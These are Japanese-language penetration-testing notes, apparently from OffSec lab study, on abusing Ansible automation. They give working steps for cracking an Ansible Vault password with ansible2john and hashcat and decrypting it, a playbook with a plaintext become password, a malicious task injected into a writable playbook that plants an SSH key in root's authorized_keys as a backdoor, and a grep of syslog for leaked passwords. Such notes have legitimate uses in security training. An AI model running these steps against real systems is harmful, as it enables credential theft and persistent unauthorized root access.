# プレイブック悪用
root権限があればansible管理者ユーザのホームから秘密鍵を抜き出して直接ログイン可能
↑これがない場合を想定する

### 特定ユーザでのプレイブック実行
リモート先のノードにファイル書き込み権限としてoffsecユーザの資格情報が必要な場合
`become: yes`はデフォルトでroot権限での動作となる
```
---
- name: Write a file as offsec
  hosts: all
  gather_facts: true
  become: yes
  become_user: offsec
  vars:
    ansible_become_pass: lab
  tasks:
    - copy:
          content: "This is my offsec content"
          dest: "/home/offsec/written_by_ansible.txt"
          mode: 0644
          owner: offsec
          group: offsec
```

プレイブックの実行
```
ansible-playbook writefile.yaml
```

### Ansible Vault
プレイブック上にvulatキーワードによる暗号化を解く以下は、vaultにパスフレーズがかけられているためそのパスフレーズを解く方法
```yaml
ansible_become_pass: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          39363631613935326235383232616639613231303638653761666165336131313965663033313232
          3736626166356263323964366533656633313230323964300a323838373031393362316534343863
          36623435623638373636626237333163336263623737383532663763613534313134643730643532
          3132313130313534300a383762366333303666363165383962356335383662643765313832663238
          3036
```

test.ymlとしていかを保存（余分なスペースは除去）
```txt
$ANSIBLE_VAULT;1.1;AES256
39363631613935326235383232616639613231303638653761666165336131313965663033313232
3736626166356263323964366533656633313230323964300a323838373031393362316534343863
36623435623638373636626237333163336263623737383532663763613534313134643730643532
3132313130313534300a383762366333303666363165383962356335383662643765313832663238
3036
```

$ANSIBLE_VAULT以降をコピーしてansible2johnで形式変更
```sh
ansible2john test.yml
```

以下の形式をtesthash.txtファイルに保存
```sh
$ansible$0*0*9661a952b5822af9a21068e7afae3a119ef0312276baf5bc29d6e3ef312029d0*87b6c306f61e89b5c586bd7e182f2806*28870193b1e448c6b45b68766bb731c3bcb77852f7ca54114d70d52121101540
```

hashcatにかける
```sh
hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt
```

test.ymlをpw.txtとしてansibleホストに保存し、ansible-vault decryptを実行し復号
```sh
cat pw.txt | ansible-vault decrypt
```

### Playbookの権限が脆弱
書き込み権限のあるプレイブックに悪意のあるタスクを追加

以下は`become: yes`としてroot権限でSSHバックドアの作成
```yaml
---
- name: Get system info
  hosts: all
  gather_facts: true
  become: yes
  tasks:
    - name: Display info
      debug:
          msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"

    - name: Create a directory if it does not exist
      file:
        path: /root/.ssh
        state: directory
        mode: '0700'
        owner: root
        group: root

    - name: Create authorized keys if it does not exist
      file:
        path: /root/.ssh/authorized_keys
        state: touch
        mode: '0600'
        owner: root
        group: root

    - name: Update keys
      lineinfile:
        path: /root/.ssh/authorized_keys
        line: "ssh-rsa AAAAB3NzaC1...Z86SOm..."
        insertbefore: EOF
```

### 機密データ漏洩
一部のモジュールはモジュールパラメータの形でデータを /var/log/syslogに漏洩します。

```
cat /var/log/syslog | grep password
```